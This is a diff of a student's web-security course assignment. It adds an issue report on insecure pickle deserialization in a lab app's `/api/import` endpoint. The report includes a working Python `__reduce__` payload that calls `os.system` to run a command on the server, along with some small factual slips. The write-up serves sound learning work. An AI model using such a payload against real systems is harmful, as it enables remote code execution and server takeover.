@@ -104,7 +104,7 @@ Group ID: TTV19S1
    **Mitigation:**
 
    - Sanitize every input field to prevent the XSS
-   - use the `Content-Type` and `X-Content-Type-Options` headers to ensure that browsers interpret the responses in the way we intend.
+   - Use the `Content-Type` and `X-Content-Type-Options` headers to ensure that browsers interpret the responses in the way we intend.
 
    
 
@@ -114,11 +114,78 @@ Group ID: TTV19S1
 
    - Based on lecture videos try to explain the terms serialization and deserialization used in computer science
 
-     Serialization is a process of converting the state of object into a byte stream that might store on file, memory, or database. Deserialization is a reverse of serialization which means it is a mechanism that use the byte stream to create the actual object in the particular object. Benifits of serialization is that we can save the state of object and can send the byte stream across the network.
+     **Serialization** is a process of converting the state of object into a byte stream that might store on file, memory, or database. Deserialization is a reverse of serialization which means it is a mechanism that use the byte stream to create the actual object in the particular object. Benifits of serialization is that we can save the state of object and can send the byte stream across the network.
 
-     The vulnerabilities that might be enable is when attacker manipulate the serialized object such as replace a serialized object with an object of different class. That means attacker can pass harmful data into application.
+     The **vulnerabilities** that might be enable is when attacker manipulate the serialized object such as replace a serialized object with an object of different class. That means attacker can pass harmful data into application.
 
-     The different of serialization between programming language is the type of serialization file. For example, java will convert to .ser and python might convert to .picl (in case we use pickle library)
+     The **different** of serialization between programming language is the type of serialization file. For example, java will convert to .ser and python might convert to .picl (in case we use pickle library)
 
 2. [Issue report] WasDat Insecure Deserialization (7 pts)
+
+   **Title:** Attcker can run linux command inside wasdat's backend via insecure deserialization.
+
+   **Description:** Attacker can deserialize their object that contains linux command and send it as an payload to API POST `/api/import` because backend use pickle python libraty to deserialization which has the vulnerability. Pickle take the state of a python object and convert to byte stream. Pickle is dangerous because during deserialization pickle execute `__reduce__` which attacker can override e.g. linux command that see the content of password file.
+
+   **Step to produce:**
+
+   - Make OPTIONS method on `/api/import` to see the allow method: `POST` and `OPTIONS` are allowed
+
+     <img src="/Users/boyplus/Desktop/CS/JAMK/Web-App-Security/Week4/Screenshot/Screen Shot 2565-02-09 at 20.19.24.png" alt="Screen Shot 2565-02-09 at 20.19.24" style="zoom:50%;" />
+
+   - Create `main.py` file to serialize the object with base64 encode as shown below
+
+     ```python
+     import os
+     import pickle
+     import base64
+     
+     def serialize_exploit():
+     	obj = {"name": "Thanaphon"}
+     	res = base64.b64encode(pickle.dumps(obj)).decode()
+     	print(res)
+     
+     if __name__ == '__main__':
+     	serialize_exploit()
+     ```
+
+   - Run this python file and store the output in `.pickle` file: `python3 main.py >> data.pickle`
+
+     - The content should like this `gASVFwAAAAAAAAB9lIwEbmFtZZSMCVRoYW5hcGhvbpRzLg==`
+
+   - Make HTTP request to POST `/api/import` to get **WasFlag9_1** and **WasFlag9_2** as shown below
+
+     ![Screen Shot 2565-02-09 at 23.52.41](/Users/boyplus/Desktop/CS/JAMK/Web-App-Security/Week4/Screenshot/Screen Shot 2565-02-09 at 23.52.41.png)
+
+   - Verify that you are able to run arbitrary command on the target server (2 pts) 
+
+     In order to run command on target server, we need to implement the `reduce` method as shown below
+
+     ```python
+     import os
+     import pickle
+     import base64
+     
+     class RCE:
+         def __reduce__(self):
+         	cmd = ('touch boyplus.txt')
+         	return os.system, (cmd,)
+     
+     if __name__ == '__main__':
+         pickled = pickle.dumps(RCE())
+         print(base64.urlsafe_b64encode(pickled).decode())
+     ```
+
+     Run `python3 main.py >> RCE.pickle` and use `RCE.pickle` to make a request to `/api/import`
+
+     After backend deserialized, file `boyplus.txt` will be created in `/bin/bash`  as shown below
+
+     ![Screen Shot 2565-02-10 at 00.00.57](/Users/boyplus/Desktop/CS/JAMK/Web-App-Security/Week4/Screenshot/Screen Shot 2565-02-10 at 00.00.57.png)
+
+   
+
+   **Impact Estimation:** High serverity because attacker can reverse shell of backend and control the entire server.
+
+   **Mitigation:**
+
+   - User JSON serialization/deserialization library instead of `pickle` library which has the vulnerability in deserialization.
 
